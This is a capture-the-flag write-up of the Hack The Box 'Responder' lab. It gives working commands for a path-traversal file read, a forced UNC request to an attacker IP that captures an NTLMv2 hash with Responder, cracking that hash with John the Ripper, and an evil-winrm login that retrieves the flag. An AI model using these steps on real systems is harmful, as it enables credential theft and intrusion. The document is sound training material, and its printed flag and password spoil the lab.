---
date created: Thursday, January 1st 2026, 2:28:14 pm
date modified: Thursday, January 8th 2026, 12:36:47 pm
---

# Responder:

**Type:** *Windows, Very Easy*
## Enumeration:

- `nmap -sC -sV --min-rate 5000 10.129.26.124`
	- `port 80/http/Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)`
	- `port 5985/http/Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)`

When checking the website via a browser we are redirected to **unika.htb**, which results in us being unable to connect to the site. 

Port 5985 is also what enables us to connect to the machine via WinRM during exploitation.

Need to add this to hosts:
```Bash
su # You need to be in root to actually modify hosts within pwnbox
sudo echo "10.129.26.124 unika.htb" >> /etc/hosts
cat /etc/hosts/ # Checking that the command worked.
ping unika.htb # Checking the name resolves
exit # Control+D also works, leave superuser state.
```

**This is a vital step for completing boxes.** HTB controls the lab environments and my machine doesn't know how to resolve `unika.htb -> 10.129.26.124` adding it to hosts, tells my system where to go.

Ensure that you either clean up, or respawn your own environment from time to time. As so you don't clog the hosts file with IPs that are getting re-used.
## Exploitation:

The challenge hints at viewing the page with different languages and then directly tells us about **[[../../../Frameworks/Attack Techniques/Web/LFI (Local File Inclusion)|LFI (Local File Inclusion)]]** within the URL parameter.

We can exploit this to view the hosts file within the server by performing the following:
```Bash
curl "http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts"
```

(This can also be done via Burp suite or a regular web browser. It's good practice to store the payload in a simple command, so we can save the output and repeat it easily.)

Another vulnerability hinted at is a [[../../../Frameworks/Attack Techniques/Web/RFI (Remote File Inclusion)|RFI (Remote File Inclusion)]], these are dangerous because they can lead to direct [[../../../Glossary#^RCE-def|Remote Code Execution!]]

NTLM (New Technology LAN Manager), is dangerous to use, since the passwords can be brute forced, Microsoft no longer recommends the usage of NTLM in applications since 2010. We can break NTLM using the tool [**Responder](https://github.com/SpiderLabs/Responder).**

Responder uses the [T1557.001 - Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001/) technique, then once we capture the NTLM hashes we can break them through brute force using `hashcat` or `johntheripper` ([T1110.002 - Brute Force: Password Cracking](https://attack.mitre.org/techniques/T1110/002/))

We exploit this by doing the following:

```Bash
sudo responder -I tun0 # Use whatever active network interface (eth0)
curl http://unika.htb/index.php?page=//YOUR_IP/share # Check your IP
```

We then check responders output, in this case it's:

```
[SMB] NTLMv2-SSP Client   : 10.129.26.124
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:6ca7ebf688ad3148:2A53EB89812AC45DCBCD68AEC61BD66C:010100000000000080D4FB436280DC01AFD3217EF5E5647500000000020008005A00340059004D0001001E00570049004E002D0034004E00330048004C00450048004E0053005600410004003400570049004E002D0034004E00330048004C00450048004E005300560041002E005A00340059004D002E004C004F00430041004C00030014005A00340059004D002E004C004F00430041004C00050014005A00340059004D002E004C004F00430041004C000700080080D4FB436280DC01060004000200000008003000300000000000000001000000002000000F245E6D7555B5B17092B0EFCD8E7D9432845CD8048622265873236ED92968CE0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100350031000000000000000000
```

Finally we crack the NTLMv2 Hash locally using a password cracker [`johntheripper`](https://www.openwall.com/john/doc/) in our case:

```Bash
echo "YOUR-HASH-STRING" > passwd
sudo gunzip /usr/share/wordlists/rockyou.txt.gz # Make sure to unzip if needed.
john --wordlist=/usr/share/wordlists/rockyou.txt passwd
> badminton        (Administrator)
```

## WinRM:

### What is WinRM?:

WinRM (Windows Remote Management) is similar to `ssh` and enables users to connect remotely to a machine and manage it via the command line.

It's usually located on `port 5985/http` or `port 5986/https`. WinRM uses these protocols to send the data rather than a custom protocol, it helps do the following:

1. Firewall - HTTP/HTTPS traffic is less likely to be blocked
2. HTTP/HTTPS infrastructure - you can use existing web proxies, load balancers, and SSL certificates
3. Standardisation - WS-Management is an open standard, not Microsoft proprietary, so needs a widely support transport.

e.g. Enables solid communication between client and server without hassle.

### Exploiting Using Evil-WinRM

Now that we have the credentials of `administrator:badminton`. We can connect to the machine remotely using WinRM:

```Bash
evil-winrm -i 10.129.26.124 -u administrator -p badminton
```

The flag can be found within `\Users\mike\desktop`

```Bash
*Evil-WinRM* PS C:\Users\mike\desktop> cat flag.txt
ea81b7afddd03efaa0945333ed147fac
```

***

# Key Takeaways:

- Always search all ports when using nmap `-p-` is critical so you don't miss anything, give it time, go make some tea or water.
- LFIs can setup potentially RFIs
- Don't use outdated security protocols (NTLM)
- Close ports for remote access, unless you really need it, if you do secure them strongly.
- Brute force password cracking depends on the quality of your wordlist.
	- In this sense, use wordlists like `rockyou` or from `SecLists` get an accurate brute force test/attack.
- Understand the processes, not specific tools - since the tools will change over time.
	- Mapping to MITRE ATT&CK is good here.